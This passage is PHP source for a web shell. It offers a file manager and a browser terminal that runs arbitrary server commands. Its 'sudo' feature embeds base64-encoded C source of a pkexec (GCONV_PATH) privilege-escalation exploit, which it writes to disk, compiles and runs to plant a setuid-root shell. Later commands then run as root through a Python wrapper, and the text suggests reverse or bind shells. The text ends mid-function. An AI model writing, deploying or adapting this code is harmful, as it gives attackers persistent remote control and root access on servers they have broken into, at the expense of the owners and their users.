        <table id="dir_table" class="tablesorter border-collapse table-auto w-full text-sm text-left rtl:text-right text-themecolor-400">
        <thead class="text-xs sticky top-0 uppercase bg-themecolor-700 text-themecolor-400 rounded-t-lg">
            <tr>
                <th scope="col" class="p-4 sorter-false">
                    <div class="flex items-center">
                        <input id="checkbox-item" onclick="C(`checkbox-item`)" type="checkbox" class="w-4 h-4 accent-primary text-primary rounded focus:ring-primary ring-offset-themecolor-800 focus:ring-offset-themecolor-800 focus:ring-2 bg-themecolor-800 border-themecolor-600">
                    </div>
                </th>
                <th scope="col" class="pr-6 py-3">File/Folder</th>
                <th scope="col" class="px-6 py-3">Size</th>
                <th scope="col" class="px-6 py-3">Type</th>
                <th scope="col" class="px-6 py-3">Permission</th>
                <th scope="col" class="px-6 py-3 text-center sorter-false">Owner/Group</th>
                <th scope="col" class="px-6 py-3">Last Modified</th>
                <th scope="col" class="px-6 py-3 sorter-false">Action</th>
            </tr>
            <tr role="row" class="h-[1px]">
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
            </tr>
            <tr role="row" class="text-sm text-left rtl:text-right text-themecolor-400 bg-themecolor-800 hover:brightness-75">
                <td class="w-4 p-4 sorter-false">
                </td>
                <th scope="row" class="sorter-false py-4 font-bold whitespace-nowrap text-foreground">
                    <div class="flex items-center justify-start gap-2 max-w-[12rem]">
                        <img src="' . Filesman::__icon('folder') . '" class="w-4 h-4">
                        <a class="truncate w-full hover:brightness-75" href="#action=' . $GLOBALS['ER0_string']['filesman'] . "&dir=" . Utils::__string_enc($PARENT_PATH) . '" title="Parent Directory"><span class="text-primary">[..]</span></a>
                    </div>
                </th>
                <td class="px-6 py-4 sorter-false"><div class="flex items-center"><span class="w-[4.5rem]">[DIR]</span></div></td>
                <td class="px-6 py-4 sorter-false lowercase">
                    <div class="flex items-center">
                    <span class="truncate w-20" title="directory">directory</span>
                    </div>
                </td>
                <td class="px-6 py-4 text-center sorter-false lowercase">' . Filesman::__get_permission($PARENT_PATH, 'chr') . '</td>
                <td class="px-6 py-4 text-center sorter-false lowercase">' . Filesman::__get_file_ownergroup($PARENT_PATH) . '</td>
                <td class="px-6 py-4 sorter-false lowercase">' . Filesman::__get_lastmodified($PARENT_PATH) . '</td>
                <td class="flex items-center px-6 py-4 gap-1 sorter-false"></td>
            </tr>

            <tr role="row" class="h-[1px]">
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
                <td class="sorter-false h-[1px] bg-themecolor-600"></td>
            </tr>
        </thead>
        <tbody id="dir_table_content">

        ';

        // Initialize arrays to store directories and files separately
        $dirs = [];
        $files = [];

        // Scan the directory and separate items into directories and files
        foreach (scandir($path) as $item) {
            if ($item == "." || $item == "..") {
                continue;
            }
            $itemPath = Utils::__construct_path($path . __DIRECTORY_SEPARATOR__ . $item);
            if (is_dir($itemPath)) {
                $dirs[] = $item;
            } else {
                $files[] = $item;
            }
        }

        function generate_row($itemPath, $item, $isDir, $path, $count)
        {

            if ($isDir) {
                $val['btnhref'] = "#action=" . $GLOBALS['ER0_string']['filesman'] . "&dir=" . Utils::__string_enc($path) . "&dirname=" . Utils::__string_enc($item);
                $val['href'] = "#action=" . $GLOBALS['ER0_string']['filesman'] . "&dir=" . Utils::__string_enc($itemPath);
                $val['img'] = Filesman::__icon('folder');
                $val['check'] = "item='dir' dir='" . Utils::__string_enc($path) . "' file='" . Utils::__string_enc($item) . "'";
                $val['name'] = "<span class='text-primary'>" . $item . "</span>";
                $val['size'] = $GLOBALS['ER0_config']['show_foldersize'] ? Filesman::__get_size(Filesman::__get_dir_size($item), true) : "[DIR]";
                $val['type'] = "directory";
                $val['action'] = "
            <option value='" . Utils::__string_enc('rename') . "' class='text-left'>Rename</option>
            <option value='" . Utils::__string_enc('copy') . "' class='text-left'>Copy</option>
            <option value='" . Utils::__string_enc('move') . "' class='text-left'>Move</option>
            <option value='" . Utils::__string_enc('zip') . "' class='text-left'>Zip</option>
            <option value='" . Utils::__string_enc('link') . "' class='text-left'>Direct Link</option>
            <option value='" . Utils::__string_enc('chmod') . "' class='text-left'>Chmod</option>
            <option value='" . Utils::__string_enc('time') . "' class='text-left'>Edit Time</option>
            <option value='" . Utils::__string_enc('delete') . "' class='text-left'>Delete</option>
            ";
            } else {
                $ext = strtolower(pathinfo($itemPath, PATHINFO_EXTENSION));

                $val['href'] = "#action=" . $GLOBALS['ER0_string']['filesman'] . "&dir=" . Utils::__string_enc($path) . "&file=" . Utils::__string_enc($item);
                $val['img'] = Filesman::__icon($ext);
                $val['check'] = "item='file' dir='" . Utils::__string_enc($path) . "' file='" . Utils::__string_enc($item) . "'";
                $val['name'] = ($item == basename(__SCRIPT__)) ? "<span class='text-themecolor-green font-bold'>$item</span>" : $item;
                $val['size'] = Filesman::__get_size($itemPath);
                $val['type'] = Filesman::__get_filetype($itemPath);
                $val['action'] = ((Terminal::__check_execute(true) ? in_array($ext, $GLOBALS['ER0_array']['arc_ext']) : $ext == 'zip') ? "<option value='" . Utils::__string_enc('extract') . "' class='text-left'>Extract</option>" : "<option value='" . Utils::__string_enc('edit') . "' class='text-left'>Edit</option>") .
                    "<option value='" . Utils::__string_enc('rename') . "' class='text-left'>Rename</option>
            <option value='" . Utils::__string_enc('copy') . "' class='text-left'>Copy</option>
            <option value='" . Utils::__string_enc('move') . "' class='text-left'>Move</option>
            <option value='" . Utils::__string_enc('link') . "' class='text-left'>Direct Link</option>
            <option value='" . Utils::__string_enc('raw') . "' class='text-left'>View Raw</option>
            <option value='" . Utils::__string_enc('download') . "' class='text-left'>Download</option>
            <option value='" . Utils::__string_enc('chmod') . "' class='text-left'>Chmod</option>
            <option value='" . Utils::__string_enc('time') . "' class='text-left'>Edit Time</option>
            <option value='" . Utils::__string_enc('delete') . "' class='text-left'>Delete</option>
            ";
            }

            return '<tr class="border-b bg-themecolor-800 border-themecolor-600 hover:brightness-75">
                    <td class="w-4 p-4">
                        <div class="flex items-center">
                            <input ' . $val['check'] . ' type="checkbox" class="check-item w-4 h-4 accent-primary text-primary rounded focus:ring-primary ring-offset-themecolor-800 focus:ring-offset-themecolor-800 focus:ring-2 bg-themecolor-700 border-themecolor-600">
                        </div>
                    </td>
                    <td scope="row" class=" py-4 ' . ($isDir ? "font-bold" : "font-medium") . ' whitespace-nowrap text-foreground">
                        <div class="flex items-center justify-start gap-2 max-w-[12rem]">
                            <img src="' . $val['img'] . '" class="w-4 h-4">
                            <a class="truncate w-full hover:brightness-75" href="' . $val['href'] . (!$isDir ? "&opt=" . Utils::__string_enc('open') : "") . '" title="' . $item . '">' . $val['name'] . '</a>
                        </div>
                    </td>
                    <td class="px-6 py-4"><div class="flex items-center"><span class="w-[4.5rem]">' . $val['size'] . '</span></div></td>
                    <td class="px-6 py-4">
                        <div class="flex items-center">
                        <span class="truncate w-20" title="' . $val['type'] . '">' . $val['type'] . '</span>
                        </div>
                    </td>
                    <td class="px-6 py-4 text-center">' . Filesman::__get_permission($itemPath, 'chr') . '</td>
                    <td class="px-6 py-4">
                        <div class="flex justify-center items-center">
                        <span class="truncate text-center w-20" title="' . Filesman::__get_file_ownergroup($itemPath) . '">' . Filesman::__get_file_ownergroup($itemPath) . '</span>
                        </div>
                    </td>
                    <td class="px-6 py-4 ">' . Filesman::__get_lastmodified($itemPath) . '</td>
                    <td class="flex items-center px-6 py-4 gap-1">
                    <select id="action-' . md5($item . $count) . '" class="px-2 bg-themecolor-700 h-6 w-32 border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block" >' . $val['action'] . '</select><a onclick="$(this).attr(`href`, `' . (!empty($val['btnhref']) ? $val['btnhref'] : $val['href']) . '&opt=`+$(`#action-' . md5($item . $count) . '`).val());" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary px-2 h-6 border border-themecolor-600">>></a>
                    </td>
                </tr>';
        }

        $count = 1;

        // Process directories first
        foreach ($dirs as $dir) {
            $itemPath = Utils::__construct_path($path . __DIRECTORY_SEPARATOR__ . $dir);
            $content .= generate_row($itemPath, $dir, true, $path, $count);
            $count++;
        }

        // Process files next
        foreach ($files as $file) {
            $itemPath = Utils::__construct_path($path . __DIRECTORY_SEPARATOR__ . $file);
            $content .= generate_row($itemPath, $file, false, $path, $count);
            $count++;
        }

        // Close the table body and return the content
        $content .= '</tbody></table>';

        return $content;
    }
}
class Terminal
{
    /**
     * Print the frontend for html
     * @param string $dir
     */
    public static function __terminal_html($dir)
    {

        $canExecute = self::__check_execute(true);
        $userInfo = Utils::__get_usergroup();
        $usrgrp = ($userInfo['user'] == 'root' ? '<span class="text-themecolor-red">' : '<span class="text-themecolor-blue">') . $userInfo['user'] . ' <i class="bx bx-injection" ></i> ' . __SERVER_HOST__ . '</span>';
        $prefix = ($userInfo['user'] == 'root' ? '<span class="text-themecolor-red">#</span>' : '<span class="text-themecolor-blue">$</span>');

        return '
<div class="md:flex gap-2 text-left">
            <div class="w-full">
            <input type="hidden" id="pre_cmd" value="">
            <input type="hidden" id="current_dir" value="' . Utils::__charcode_enc($dir) . '">
                <label class="block text-sm font-medium text-foreground">Shell: <span class="text-themecolor-400"><' . ($canExecute ? '<span class="text-themecolor-green" id="exec_cmd">~' : '<span class="text-themecolor-red" id="exec_cmd">Unable to execute command') . '</span>> ' . ($canExecute ? '' : '<a onclick="window.scrollTo(0,0)" href="#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . $dir . '" class="text-primary hover:brightness-75">[EXIT]</a>') . '</span></label>
                <label class="block mb-2 text-sm font-medium text-foreground">Help: <span class="text-themecolor-400"><<span class="text-themecolor-orange">!help</span>> show terminal helps</span> | <span class="text-themecolor-400"><<span class="text-themecolor-orange">sudo | sudo -f (force)</span>> root shell</span></label>
                <div class="h-auto flex-1">
                    <div id="terminal_output" class="' . ($canExecute ? 'h-[75vh]' : 'h-auto') . ' overflow-auto whitespace-pre block p-2 w-full text-sm rounded-lg border bg-themecolor-700 border-themecolor-600 text-themecolor-400"><div style="line-height: 0.93rem !important;"><span class="text-foreground">&boxdr;&boxh;(' . $usrgrp . ')&boxh;(<span class="text-themecolor-green" id="pre-home"></span>)</span><div class="flex gap-1 items-center"><span class="text-foreground">&boxur;&boxh;' . $prefix . '</span><input type="text" ' . ($canExecute ? 'onkeypress="if(event.key === `Enter` || event.keyCode === 13){event.preventDefault(); TERM(this);}"' : 'disabled readonly') . ' class="prompt text-primary px-1 p-0 text-sm block w-full bg-transparent border-0 appearance-none border-themecolor-600 focus:outline-none focus:ring-0" placeholder="' . ($canExecute ? 'ls -la' : 'Unable to execute command') . '"></div></div><script>$(`#pre-home`).text(( (localStorage.getItem("cwd") == ``) ? `' . $dir . '` : charcodeDec(localStorage.getItem("cwd"))));</script></div>
                </div>
            </div>
        </div>'
        ;
    }

    public static function __terminal_js()
    {
        $canExecute = self::__check_execute(true);
        $userInfo = Utils::__get_usergroup();

        if (Session::__check_session()) {
            return
'localStorage.setItem("usr","");
            function prompt(pwd,root = false){
                currentUser = (root ? "r00t" : localStorage.getItem("usr"));
                USERPROMPT = (currentUser == `r00t` ? `<span class="text-themecolor-red">root` : `<span class="text-themecolor-blue">'. $userInfo['user'] .'`) + ` <i class="bx bx-injection" ></i> '. __SERVER_HOST__ .'</span>`;
                PREFIXPROMPT = (currentUser == `r00t` ? `<span class="text-themecolor-red">#</span>` : `<span class="text-themecolor-blue">$</span>`);

                execute_ = "if(event.key === `Enter` || event.keyCode === 13){event.preventDefault(); TERM(this);}";
                return `<div style="line-height: 0.93rem !important;"><span class="text-foreground prompt">&boxdr;&boxh;(${USERPROMPT})&boxh;(<span class="text-themecolor-green">${pwd}</span>)</span><div class="flex gap-1 items-center"><span class="text-foreground">&boxur;&boxh;${PREFIXPROMPT}</span><input type="text" '. ($canExecute ? 'onkeypress="${execute_}"' : 'disabled readonly') .' class="prompt text-primary px-1 p-0 text-sm block w-full bg-transparent border-0 appearance-none border-themecolor-600 focus:outline-none focus:ring-0" placeholder="'. ($canExecute ? 'ls -la' : 'Unable to execute command') .'"></div></div>`;
            }

            function TERM(ele){
                command = ele.value;
                ele.setAttribute("disabled", "");
                ele.removeAttribute("autofocus");
                ele.classList.remove("prompt");
                termdir = localStorage.getItem("cwd");
                currentUser = localStorage.getItem("usr");
                current_dir = $("#current_dir").val();

                params = getParams();

                if(termdir == "" || termdir == null){
                    termdir = "";
                }

                if(command == ""){
                    command = "ls -la";

                } else if (command == "clear" || command == "cls"){
                    cwd = (localStorage.getItem("cwd") != "" ? charcodeDec(localStorage.getItem("cwd")) : charcodeDec(current_dir));
                    if(currentUser == "r00t"){
                        $(`#terminal_output`).html(prompt(cwd,true));
                    } else {
                        $(`#terminal_output`).html(prompt(cwd));
                    }
                    setTimeout(function(){$(`.prompt`).focus();},100);
                    return false;

                } else if (command == "exit"){
                    cwd = (localStorage.getItem("cwd") != "" ? charcodeDec(localStorage.getItem("cwd")) : charcodeDec(current_dir));
                    if(currentUser == "r00t"){
                        localStorage.setItem("usr","");
                        $(`#terminal_output`).append(`<br>`+prompt(cwd));
                        setTimeout(function(){$(`.prompt`).focus();},100);
                    } else {
                        window.scrollTo(0,0);
                        location.href = "#action='. $GLOBALS['ER0_string']['filesman'] .'&dir="+params["dir"];
                    }
                    return false;
                }


                var DATA = {
                    "key": "CMD",
                    "dir": params["dir"],
                    "cwd": termdir,
                    "usr": charcodeEnc(currentUser),
                    "cmd": charcodeEnc(command)
                };

                $("#tools_container").addClass(`overflow-auto`);

                notify(`loading`);

                const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
                sendRequest.send(
                    function (data) {
                        Swal.close();
                        data = JSON.parse(data);

                        output = charcodeDec(data.output);
                        shell = charcodeDec(data.shell);
                        pwd = charcodeDec(data.pwd);
                        r = data.r;

                        if(pwd == ""){
                            pwd = charcodeDec(current_dir);
                        }

                        localStorage.setItem("cwd", data.pwd);

                        if(r == ""){
                            prompts = prompt(pwd);
                        } else {
                            prompts = prompt(pwd,r);
                        }

                        $(`#terminal_output`).append(`<pre class="setFontsMono">${output}</pre><br>${prompts}`);
                        $(`#exec_cmd`).text(shell);

                        setTimeout(function(){$(`.prompt`).focus();},100);

                        var objDiv = document.getElementById("terminal_output");
                        objDiv.scrollTop = objDiv.scrollHeight;
                        var mainDiv = document.getElementsByTagName("body");
                        mainDiv.scrollTop = mainDiv.scrollHeight;

                    },
                    function (status, error) {
                        if(status != 0){
                            console.error("AJAX Error:", status, error);
                            clr = `red`;
                            if(status >= 500){
                                clr = `yellow`;
                            }
                            notify(`error`, charcodeEnc(status +" "+ error),true, `<i class="bx bx-error bx-tada text-5xl" ></i>`, `ERROR!`, clr, 10000000);
                        }
                    }
                );
            }'
            ;
        }
    }

    public static function __terminal()
    {
        if (isset(${"_POST"}['key']) && Request::__post_request('key') == 'CMD') {
            $command = Utils::__charcode_dec(Request::__post_request('cmd'));
            $cwd = Utils::__charcode_dec(Request::__post_request('cwd'));
            $currentusr = Utils::__charcode_dec(Request::__post_request('usr'));
            $currentdir = Utils::__string_dec(Request::__post_request('dir'));
            $r = false;

            $pwd = "pwd";
            $seperator = ";";

            if ($GLOBALS['ER0_string']['sys'] != 'unix') {
                $pwd = "cd";
                $seperator = "&";
            }

            $current_path = '';
            if (!empty($cwd)) {
                $cmd = "cd '" . addslashes($cwd) . "'" . $seperator;
                $current_path = $cwd;
            } else {
                $cmd = "cd '" . addslashes($currentdir) . "'" . $seperator;
            }

            if ($command == 'cd' || $command == 'home') {
                $cmd = "cd '" . addslashes($currentdir) . "'" . $seperator;
                $current_path = $currentdir;
            } else if ($command == 'shell') {
                $cmd = "cd '" . addslashes(dirname(__SCRIPT_PATH__)) . "'" . $seperator;
                $current_path = dirname(__SCRIPT_PATH__);
            }

            if (preg_match("/cd[ ]{0,}(.*)[ ]{0,}" . $seperator . "|cd[ ]{0,}(.*)[ ]{0,}/i", $command, $match)) {
                if (empty($match[1])) {
                    $match[1] = $match[2];
                }
                $current_path = self::__execute("cd " . addslashes($match[1]) . $seperator . $pwd);
                $current_path = str_replace("\\", "/", $current_path);
                if ($GLOBALS['ER0_string']['sys'] === 'win') {
                    $current_path = str_replace('/cygdrive/', '', $current_path);
                    $current_path = preg_replace('/^([a-z])/', '$1:', $current_path);
                    $current_path = Utils::__construct_path($current_path);
                }
            }

            if ($command == '!help') {
                $fullOutput = "
                <div class='grid gap-1 mb-1'>
                    <span>Available WebShell Terminal Command:</span>
                    <div class='relative flex ml-3'>
                        <span class='text-themecolor-orange'>{clear | cls}</span><span class='absolute ps-[7.5rem]'>: Clear the terminal</span>
                    </div>
                    <div class='relative flex ml-3'>
                        <span class='text-themecolor-orange'>{cd | home}</span><span class='absolute ps-[7.5rem]'>: Goto directory in parameter</span>
                    </div>

                    <div class='relative flex ml-3'>
                        <span class='text-themecolor-orange'>{shell}</span><span class='absolute ps-[7.5rem]'>: Goto shell directory</span>
                    </div>
                    <div class='relative flex ml-3'>
                        <span class='text-themecolor-orange'>{exit}</span><span class='absolute ps-[7.5rem]'>: Exit the terminal tools</span>
                    </div>
                </div>";
            } else if (str_contains($command, 'sudo')) {
                if ($GLOBALS['ER0_string']['sys'] == 'win') {
                    $fullOutput = 'Cannot get root shell on windows!';
                } else {
                    if (self::__check_root()) {
                        $force = str_contains($command, '-f');
                        $bypassversion = true;
                        if (!$force) {
                            if (preg_match('/[^\D]\d{1,}/', self::__execute('pkexec --version'), $pkv)) {
                                $pkexecversion = $pkv[0];
                                if (!str_contains($command, '-vf')) {
                                    if ($pkexecversion > 105) {
                                        $fullOutput = '<span class="text-themecolor-yellow font-bold">Warning!:</span>
  <span class="text-themecolor-orange">pkexec v' . $pkexecversion . ' installed;</span> exploit may not work <span class="text-foreground">(needs v105 or below)</span>.
  Recommend using a bind/reverse shell for root access.
  <span class="text-foreground">To force version: <span class="text-themecolor-blue underline">sudo -vf</span></span>';
                                        $bypassversion = false;
                                    }
                                }
                            }
                        }
                        if ($bypassversion) {
                            if (self::__get_root($force)) {
                                ob_end_clean();
                                $r = true;
                                $fullOutput = 'Shell rooted!<br>';
                                $fullOutput .= str_replace('\n', '<br>', trim(trim(trim(self::__root_exec('id'), 'b')), "'"));
                                $fullOutput .= '<script>localStorage.setItem("usr","r00t")</script>';
                            } else {
                                $fullOutput = 'Cannot get root shell!';
                            }
                        }
                    } else {
                        $fullOutput = 'Required system, python, gcc and pkexec to get root shell';
                    }
                }
            } else {
                if ($currentusr == 'r00t') {
                    $out = str_replace('\n', '<br>', trim(trim(trim(self::__root_exec($cmd . $command), 'b')), "'"));
                    // $out = trim(trim(self::__root_exec($cmd . $command),'b'),"'");
                    $fullOutput = $out;
                } else {
                    $out = self::__execute($cmd . $command);
                    $fullOutput = htmlspecialchars($out, ENT_QUOTES, 'UTF-8');
                }
            }



            $response = [
                'output' => Utils::__charcode_enc($fullOutput),
                'shell' => Utils::__charcode_enc(self::__execute('uname', true)),
                'pwd' => Utils::__charcode_enc(trim($current_path)),
                'r' => $r
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }
    }

    public static function __root_exec($command)
    {
        if (self::__check_root()) {
            $rdata = __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . $GLOBALS['ER0_data']['root_folder'][1] . __DIRECTORY_SEPARATOR__;
            $rshname = $GLOBALS['ER0_data']['rshell'][1] . '.py';
            ob_end_clean();
            ob_start();
            system('cd "' . $rdata . '"; python ' . $rshname . ' "' . $command . '" 2>&1');
            $send_cmd = ob_get_contents();
            ob_end_clean();
            return $send_cmd;
        } else {
            return 'Required system, python, gcc and pkexec to get root shell<script>localStorage.setItem("usr","")</script>';
        }
    }

    public static function __get_root($force = false)
    {
        if (self::__check_root()) {
            $rdata = __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . $GLOBALS['ER0_data']['root_folder'][1] . __DIRECTORY_SEPARATOR__;
            $rshname = $GLOBALS['ER0_data']['rshell'][1] . '.py';

            if (file_exists($rdata . 'mythx')) {
                if ($force) {
                    return true;
                } else {
                    ob_start();
                    if (str_contains(system('cd "' . $rdata . '"; python ' . $rshname . ' "id -u -n" 2>&1'), 'root')) {
                        ob_end_clean();
                        return true;
                    } else {
                        ob_end_clean();
                        return false;
                    }
                }
            } else {
                $privesc = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKY2hhciAqc2hlbGwgPSAKCSIjaW5jbHVkZSA8c3RkaW8uaD5cbiIKCSIjaW5jbHVkZSA8c3RkbGliLmg+XG4iCgkiI2luY2x1ZGUgPHVuaXN0ZC5oPlxuXG4iCgkidm9pZCBnY29udigpIHt9XG4iCgkidm9pZCBnY29udl9pbml0KCkge1xuIgoJIglzZXR1aWQoMCk7IHNldGdpZCgwKTtcbiIKCSIJc2V0ZXVpZCgwKTsgc2V0ZWdpZCgwKTtcbiIKCSIJc3lzdGVtKFwiZXhwb3J0IFBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluOyBybSAtcmYgJ0dDT05WX1BBVEg9LicgJ3B3bmtpdCc7IGNob3duIHJvb3Q6cm9vdCBzYW5zeHBsOyBjaG1vZCA0Nzc3IHNhbnN4cGw7IC9iaW4vc2hcIik7XG4iCgkiCWV4aXQoMCk7XG4iCgkifSI7CgpjaGFyICpnZXRyb290ID0gCgkiI2luY2x1ZGUgPHVuaXN0ZC5oPlxuIgoJIiNpbmNsdWRlIDxzdGRpby5oPlxuIgoJImludCBtYWluICh2b2lkKVxuIgoJIntcbiIKCSIJc2V0Z2lkKDApO1xuIgoJIglzZXR1aWQoMCk7XG4iCgkiCXN5c3RlbShcIi9iaW4vYmFzaFwiKTtcbiIKCSIJcmV0dXJuIDA7XG4iCgkifSI7CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7CglGSUxFICpmcDsKCUZJTEUgKmdyOwoJc3lzdGVtKCJta2RpciAtcCAnR0NPTlZfUEFUSD0uJzsgdG91Y2ggJ0dDT05WX1BBVEg9Li9wd25raXQnOyBjaG1vZCBhK3ggJ0dDT05WX1BBVEg9Li9wd25raXQnIik7CglzeXN0ZW0oIm1rZGlyIC1wIHB3bmtpdDsgZWNobyAnbW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDInID4gcHdua2l0L2djb252LW1vZHVsZXMiKTsKCWZwID0gZm9wZW4oInB3bmtpdC9wd25raXQuYyIsICJ3Iik7CglmcHJpbnRmKGZwLCAiJXMiLCBzaGVsbCk7CglmY2xvc2UoZnApOwoKCWdyID0gZm9wZW4oImdldHJvb3QuYyIsICJ3Iik7CglmcHJpbnRmKGdyLCAiJXMiLCBnZXRyb290KTsKCWZjbG9zZShncik7CgoJc3lzdGVtKCJnY2MgZ2V0cm9vdC5jIC1vIHNhbnN4cGwiKTsKCglzeXN0ZW0oImdjYyBwd25raXQvcHdua2l0LmMgLW8gcHdua2l0L3B3bmtpdC5zbyAtc2hhcmVkIC1mUElDIik7CgljaGFyICplbnZbXSA9IHsgInB3bmtpdCIsICJQQVRIPUdDT05WX1BBVEg9LiIsICJDSEFSU0VUPVBXTktJVCIsICJTSEVMTD1wd25raXQiLCBOVUxMIH07CglleGVjdmUoIi91c3IvYmluL3BrZXhlYyIsIChjaGFyKltdKXtOVUxMfSwgZW52KTsKfQ==";
                Filesman::__save_file($rdata . "prvesc.c", base64_decode($privesc));

                if (file_exists($rdata . "prvesc.c")) {
                    if (!file_exists($rdata . 'mythx')) {
                        self::__execute('cd "' . $rdata . '"; gcc prvesc.c -o prvesc; chmod +x prvesc; ./prvesc');
                    }
                }
                if (file_exists($rdata . 'mythx')) {
                    $rootshell = "IyEvYmluL3B5dGhvbgojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuLCBQSVBFLCBTVERPVVQKaW1wb3J0IHN5cwoKZXhwbG9pdCA9ICcuL3NhbnN4cGwnCmNtZHMgPSBzeXMuYXJndlsxXQoKcCA9IFBvcGVuKFtleHBsb2l0LCAnJ10sIHN0ZG91dD1QSVBFLCBzdGRpbj1QSVBFLCBzdGRlcnI9U1RET1VUKQpwcmludChzdHIocC5jb21tdW5pY2F0ZShpbnB1dD1jbWRzLmVuY29kZSgpKVswXSkp";
                    Filesman::__save_file($rdata . $rshname, base64_decode($rootshell));
                    if ($force) {
                        return true;
                    } else {
                        ob_start();
                        if (system('cd "' . $rdata . '"; python ' . $rshname . ' "id -u -n" 2>&1') && str_contains(system('cd "' . $rdata . '"; python ' . $rshname . ' "id -u -n" 2>&1'), 'root')) {
                            ob_end_clean();
                            return true;
                        } else {
                            ob_end_clean();
                            return false;
                        }
                    }
                } else {
                    return false;
                }
            }
        } else {
            return false;
        }
    }

    public static function __check_root()
    {
        if (Utils::__function_exist('system', '') && self::__check_cmd_function('gcc', true) && self::__check_cmd_function('python', true) && self::__check_cmd_function('pkexec', true)) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * Check what shell function can used in server
     * @param bool $output if true return bool | false return on/off
     */
    public static function __check_execute($output = false)
    {

        $ex  = "exec";
        $pst = "passthru";
        $sys = "system";
        $sex = "shell_exec";

        $o = [];
        if (Utils::__function_exist($ex, 'raw')) {
            $o[] = "$ex";
        }
        if (Utils::__function_exist($pst, 'raw')) {
            $o[] = "$pst";
        }
        if (Utils::__function_exist($sys, 'raw')) {
            $o[] = "$sys";
        }
        if (Utils::__function_exist($sex, 'raw')) {
            $o[] = "$sex";
        }

        if ($output) {
            return (empty($o) ? false : true);
        } else {
            return (empty($o) ? $GLOBALS['ER0_html']['off'] : '<span class="text-themecolor-green">' . implode(', ', $o) . '</span>');
        }
    }

    /**
     * Check what shell function can used in exec command
     * @param bool $output if true return bool | false return on/off
     */
    public static function __check_cmd_function($func, $output = false)
    {

        $o = '';

        if (self::__check_execute(true)) {
            $check = self::__execute("$func --help");
            if (!empty($check) && !strpos($check, 'not found')) {
                $o = $check;
            } else {
                $check = self::__execute("$func --version");
                if (!empty($check) && !strpos($check, 'not found')) {
                    $o = $check;
                }
            }
        }

        if ($output) {
            return (empty($o) ? false : true);
        } else {
            return (empty($o) ? $GLOBALS['ER0_html']['off'] : $GLOBALS['ER0_html']['on']);
        }
    }

    /**
     * Execute shell command
     * @param string $command
     * @param bool $detail if true return name execute with
     * @param bool $end if true return end output
     * @param bool $bool if true return true | false
     */
    public static function __execute($command, $detail = false, $end = false, $bool = false)
    {
        $ex  = "exec";
        $pst = "passthru";
        $sys = "system";
        $sex = "shell_exec";

        $output = '';
        $source = '';
        $command = $command . " 2>&1";

        if (Utils::__function_exist($ex, 'raw')) {
            $res = [];
            @$ex($command, $res);
            if (!empty($res)) foreach ($res as $line) $output .= "\n" . $line;
            $source = $ex;
        } elseif (Utils::__function_exist($pst, 'raw')) {
            ob_start();
            @$pst($command);
            $output = ob_get_contents();
            ob_end_clean();
            $source = $pst;
        } elseif (Utils::__function_exist($sys, 'raw')) {
            ob_start();
            @$sys($command);
            $output = ob_get_contents();
            ob_end_clean();
            $source = $sys;
        } elseif (Utils::__function_exist($sex, 'raw')) {
            $output = $sex($command);
            $source = $sex;
        } else {
            return "Unable to execute command";
        }

        if ($detail) {
            return $source;
        } else {
            if ($end) {
                $outputLines = explode("\n", trim($output));
                $lastLine = end($outputLines);
                return (empty($lastLine) ? "" : $lastLine);
            } else {
                if ($bool) {
                    return (empty($output) ? false : true);
                } else {
                    return (empty($output) ? "" : $output);
                }
            }
        }
    }

    public static function __temp_execute($script, $args, $exec_with = '', $name = '', $hidden = false)
    {
        function chmd($f)
        {
            $r = false;
            if (chmod($f, 0777)) $r = true;
            return $r;
        }

        function ex($tempfolder,$tempfile,$command,$con){
            $returned = [
                'status' => 'failed',
                'detail' => 'An error occured',
                'update' => 'NOTUSE',
            ];

            $ids = uniqid();
            $gets = __DATA_DIR_URL__.Utils::__create_path(['tmp',basename($tempfolder),md5($ids)."_$tempfile.php"]);
            $name = $tempfolder . __DIRECTORY_SEPARATOR__ . md5($ids)."_$tempfile.php";
            $executor = base64_decode('PD9waHA=').'

$c = base64_decode("'.base64_encode($command).'");
